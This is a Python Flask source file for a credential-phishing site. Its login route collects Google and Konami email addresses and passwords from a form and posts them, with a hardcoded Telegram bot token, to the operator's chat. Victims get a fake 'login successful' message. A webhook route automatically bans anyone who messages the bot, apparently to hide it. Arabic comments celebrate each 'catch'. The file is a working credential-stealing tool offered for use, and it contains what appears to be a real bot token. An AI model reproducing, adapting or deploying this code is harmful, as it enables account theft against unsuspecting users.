from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# التوكن والآيدي الخاص بك يا سيد
TOKEN = '8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU'
CHAT_ID = '5204157508'
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        g_email = request.form.get('g_email')
        g_pass = request.form.get('g_pass')
        k_email = request.form.get('k_email')
        k_pass = request.form.get('k_pass')
        
        msg = (
            f"🚨 صيد جديد يا سيد! 🚨\n\n"
            f"📧 إيميل جوجل: {g_email}\n"
            f"🔑 باسورد جوجل: {g_pass}\n\n"
            f"🎮 إيميل كونامي: {k_email}\n"
            f"🔑 باسورد كونامي: {k_pass}"
        )
        
        url = f"{TELEGRAM_API}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': msg,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
        
    except Exception as e:
        print(f"Error: {e}")
        
    return "تم تسجيل الدخول بنجاح! جاري تحويلك..."

# مسار الحظر التلقائي الفوري لأي شخص يدخل للبوت
@app.route(f'/{TOKEN}', methods=['POST'])
def telegram_webhook():
    try:
        json_data = request.get_json()
        
        if "message" in json_data:
            message = json_data["message"]
            chat_id = message["chat"]["id"]
            user = message.get("from", {})
            username = user.get("username", "بدون يوزر")
            first_name = user.get("first_name", "مستخدم")
            
            # حظر المستخدم فوراً من البوت (BanChatMember) بحيث يختفي ولا يستطيع التفاعل
            ban_url = f"{TELEGRAM_API}/banChatMember"
            requests.post(ban_url, json={
                'chat_id': chat_id, 
                'user_id': chat_id
            })
            
            # (اختياري) إشعار لك فقط لتعلم أن شخصاً حاول الدخول وتم حظره
            alert_msg = f"🚫 تم حظر شخص حاول دخول البوت تلقائياً!\n👤 الاسم: {first_name}\n🔗 اليوزر: @{username}\n🆔 الآيدي: {chat_id}"
            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                'chat_id': CHAT_ID, 
                'text': alert_msg
            })
                
    except Exception as e:
        print(f"Webhook Error: {e}")
        
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
